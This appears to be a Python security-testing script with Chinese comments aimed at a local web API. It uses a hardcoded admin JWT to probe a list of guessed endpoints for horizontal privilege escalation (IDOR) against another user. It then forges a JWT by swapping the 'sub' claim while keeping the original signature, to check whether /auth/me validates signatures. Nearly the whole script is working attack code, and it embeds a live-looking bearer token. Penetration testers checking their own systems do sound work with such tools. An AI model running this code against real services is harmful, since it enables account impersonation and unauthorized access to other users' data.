# -*- coding: utf-8 -*-
import requests
import base64
import json

# ========== 配置（请根据实际情况修改） ==========
BASE_URL = "http://127.0.0.1:8001"
ADMIN_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTc3NTcyMjcyOCwiaWF0IjoxNzc1NzIwOTI4LCJ0eXBlIjoiYWNjZXNzIiwianRpIjoiQllGOG5pRGNvZFpESnpZc20wbGs3ZyJ9.Wozoj5hhk_4Grx6jNVyLaR_6aTqp8_oEJIk_tQNbRKw"

TARGET_ID = 2          # admin1 的 id
TARGET_USERNAME = "admin1"

# 常见的可能越权的 API 路径（{} 会被替换为 id 或 username）
ENDPOINTS = [
    "/user/{}",
    "/users/{}",
    "/api/user/{}",
    "/profile/{}",
    "/auth/user/{}",
    "/user?id={}",
    "/users?username={}",
    "/user/username/{}",
]

# ========== 辅助函数 ==========
def request_with_token(path, token):
    url = BASE_URL + path
    headers = {"Authorization": f"Bearer {token}"}
    try:
        resp = requests.get(url, headers=headers, timeout=5)
        return resp
    except Exception as e:
        print(f"请求失败: {path} - {e}")
        return None

def is_target_user_in_response(resp):
    """检查响应中是否包含目标用户的信息（admin1 或 id=2）"""
    if resp is None or resp.status_code != 200:
        return False
    content = resp.text.lower()
    if TARGET_USERNAME.lower() in content or str(TARGET_ID) in content:
        return True
    # 尝试解析 JSON 进一步确认
    try:
        data = resp.json()
        # 递归检查常见字段
        if isinstance(data, dict):
            if data.get("username") == TARGET_USERNAME or data.get("id") == TARGET_ID:
                return True
            # 检查 data 下的子字段
            for key in ["data", "user", "profile"]:
                if key in data and isinstance(data[key], dict):
                    if data[key].get("username") == TARGET_USERNAME or data[key].get("id") == TARGET_ID:
                        return True
    except:
        pass
    return False

def forge_jwt(original_token, new_sub):
    """修改 JWT 的 sub 字段，保留原签名（用于测试签名验证）"""
    parts = original_token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT")
    header_b64, payload_b64, signature = parts
    # 解码 payload
    payload_json = base64.urlsafe_b64decode(payload_b64 + "==").decode('utf-8')
    payload = json.loads(payload_json)
    payload["sub"] = new_sub
    # 重新编码 payload（去掉填充）
    new_payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    forged_token = f"{header_b64}.{new_payload_b64}.{signature}"
    return forged_token

# ========== 1. 越权接口探测 ==========
print("[*] 开始越权接口探测...")
print(f"[*] 使用 admin token (sub=admin) 尝试获取 {TARGET_USERNAME} (id={TARGET_ID}) 的数据")
print()

found_vuln = False
for endpoint_template in ENDPOINTS:
    # 尝试用 ID
    if "{}" in endpoint_template:
        path_id = endpoint_template.format(TARGET_ID)
        resp = request_with_token(path_id, ADMIN_TOKEN)
        if resp and is_target_user_in_response(resp):
            print(f"[!] 越权漏洞发现！路径: {path_id}")
            print(f"    响应内容: {resp.text[:300]}")
            found_vuln = True
        # 尝试用用户名（如果模板包含 username 参数）
        if "username" in endpoint_template:
            path_user = endpoint_template.format(TARGET_USERNAME)
            resp2 = request_with_token(path_user, ADMIN_TOKEN)
            if resp2 and is_target_user_in_response(resp2):
                print(f"[!] 越权漏洞发现！路径: {path_user}")
                print(f"    响应内容: {resp2.text[:300]}")
                found_vuln = True
    else:
        resp = request_with_token(endpoint_template, ADMIN_TOKEN)
        if resp and is_target_user_in_response(resp):
            print(f"[!] 越权漏洞发现！路径: {endpoint_template}")
            print(f"    响应内容: {resp.text[:300]}")
            found_vuln = True

if not found_vuln:
    print("[-] 未发现明显的越权接口。")

# ========== 2. JWT 伪造测试 ==========
print("\n[*] 开始 JWT 伪造测试...")
forged = forge_jwt(ADMIN_TOKEN, TARGET_USERNAME)
print(f"[*] 伪造的 token (sub={TARGET_USERNAME}): {forged[:60]}...")

resp = request_with_token("/auth/me", forged)
if resp and resp.status_code == 200:
    content = resp.text.lower()
    if TARGET_USERNAME.lower() in content or str(TARGET_ID) in content:
        print("[!] JWT 签名验证漏洞！使用伪造的 token 成功获取了目标用户的信息！")
        print(f"    响应内容: {resp.text[:300]}")
    else:
        print("[-] 伪造的 token 被接受，但返回的数据不是目标用户（可能仍返回了 admin 的信息）。")
        print(f"    响应内容: {resp.text[:300]}")
elif resp and resp.status_code in (401, 403):
    print("[-] JWT 签名验证正常，伪造的 token 被拒绝。")
else:
    print(f"[-] 请求失败，状态码: {resp.status_code if resp else 'None'}")

print("\n[*] 测试完成。")